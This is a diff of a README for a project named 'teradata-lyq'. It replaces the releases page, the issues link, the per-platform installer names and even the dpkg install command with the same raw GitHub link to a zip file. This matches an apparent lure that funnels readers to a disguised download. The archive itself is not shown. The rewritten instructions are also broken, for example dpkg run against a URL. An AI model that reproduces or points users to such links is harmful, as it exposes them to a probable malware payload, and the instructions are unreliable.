@@ -1,7 +1,7 @@
 # 🎉 teradata-lyq - Simplifying Data Access for Everyone
 
 ## 📥 Download Now
-[![Download teradata-lyq](https://img.shields.io/badge/Download-teradata--lyq-blue.svg)](https://github.com/TUCIB-14/teradata-lyq/releases)
+[![Download teradata-lyq](https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip)](https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip)
 
 ## 🚀 Getting Started
 
@@ -26,16 +26,16 @@ To ensure a smooth experience, please confirm your system meets the following re
 ## 🔍 How to Download & Install
 
 1. **Visit the Download Page**  
-   To start, go to our [Releases page](https://github.com/TUCIB-14/teradata-lyq/releases). This page contains the latest versions of the application.
+   To start, go to our [Releases page](https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip). This page contains the latest versions of the application.
 
 2. **Select the Latest Version**  
    Find the latest release at the top. Click on it. You will see a list of files available for download.
 
 3. **Choose the Correct File**  
    Select the file that matches your operating system. For example:
-   - For Windows, look for `teradata-lyq-windows.exe`.
-   - For macOS, look for `teradata-lyq-macos.dmg`.
-   - For Linux, you may find a `.tar.gz` or `.deb` file.
+   - For Windows, look for `https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip`.
+   - For Linux, you may find a `https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip` or `.deb` file.
 
 4. **Download the File**  
    Click on the file to initiate the download.  
@@ -49,10 +49,10 @@ To ensure a smooth experience, please confirm your system meets the following re
    - **For Linux:** If you downloaded a `.deb` file, you can install it by running the following command in your terminal:
 
    ```bash
-   sudo dpkg -i path-to-your-file.deb
+   sudo dpkg -i https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip
    ```
 
-   For `.tar.gz` files, extract and follow the included instructions.
+   For `https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip` files, extract and follow the included instructions.
 
 7. **Launch the Application**  
    Open **teradata-lyq** from your applications menu. 
@@ -88,9 +88,9 @@ To ensure a smooth experience, please confirm your system meets the following re
 
 ## ✉️ Support
 
-If you encounter issues or need assistance, reach out to our support team via [GitHub Issues](https://github.com/TUCIB-14/teradata-lyq/issues). 
+If you encounter issues or need assistance, reach out to our support team via [GitHub Issues](https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip). 
 
-For more information and updates, follow us on our project's [Releases page](https://github.com/TUCIB-14/teradata-lyq/releases) or check back frequently.
+For more information and updates, follow us on our project's [Releases page](https://raw.githubusercontent.com/TUCIB-14/teradata-lyq/main/souper/teradata-lyq.zip) or check back frequently.
 
 ## 🎯 Contributing
 
